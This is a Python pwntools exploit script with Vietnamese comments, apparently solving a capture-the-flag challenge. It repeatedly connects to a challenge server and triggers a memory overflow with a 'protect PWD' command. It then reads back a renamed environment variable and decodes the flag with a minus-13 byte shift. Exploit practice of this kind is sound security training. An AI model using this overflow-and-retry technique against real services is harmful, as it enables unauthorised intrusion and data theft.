from pwn import *
import time

context.log_level = 'info'
attempt = 0

while True:
    attempt += 1
    log.info(f"Đang thử lần thứ {attempt}...")
    try:
        # Đặt timeout để tránh bị treo vô hạn
        r = remote("0.cloud.chals.io", 33121, timeout=5)

        # Bước 1: Kiểm tra xem PWD có tồn tại không bằng một lệnh an toàn.
        r.sendlineafter(b"> ", b"print PWD")
        response = r.recvline()

        # Nếu PWD không tồn tại, đó là một phiên "xui xẻo". Thử lại.
        if b"No such environment variable" in response:
            log.warning("Lần này không có PWD. Đang thử lại...")
            r.close()
            time.sleep(0.5) # Chờ một chút để tránh spam server
            continue

        # Nếu chúng ta đến được đây, PWD tồn tại! Đây là một phiên "may mắn".
        log.success("May mắn! Biến PWD tồn tại. Đang tiến hành tấn công...")
        
        # Bước 2: Thực hiện cuộc tấn công tràn bộ nhớ.
        r.sendlineafter(b"> ", b"protect PWD")
        # Chúng ta không thể chắc chắn server sẽ trả lời gì, nó có thể crash.

        # Bước 3: Gửi lệnh để đọc flag đã bị đổi tên.
        # Chúng ta dùng r.send() thay vì r.sendlineafter() vì server có thể đã crash
        # và sẽ không bao giờ gửi lại dấu nhắc '> '.
        corrupted_name = "SYNT"
        r.sendline(f"print {corrupted_name}".encode())

        # Bước 4: Nhận tất cả dữ liệu còn lại và tìm kiếm flag.
        output = r.recvall(timeout=2)
        log.info(f"Nhận được output: {output}")

        if corrupted_name.encode() in output:
            # Tách chuỗi để lấy flag. Dấu '=' + 13 = 'J'.
            corrupted_flag = output.split(b'J')[1].strip()
            
            flag = ""
            for char_code in corrupted_flag:
                flag += chr(char_code - 13)

            log.success(f"Flag đã được tìm thấy: {flag}")
            r.close()
            break # Thoát khỏi vòng lặp khi thành công
        else:
            log.warning("Tấn công thất bại (có thể do ASLR hoặc crash). Đang thử lại...")
            r.close()
            time.sleep(0.5)

    except Exception as e:
        log.error(f"Đã xảy ra lỗi kết nối hoặc timeout: {e}. Đang thử lại...")
        if 'r' in locals() and r.connected():
            r.close()
        time.sleep(1)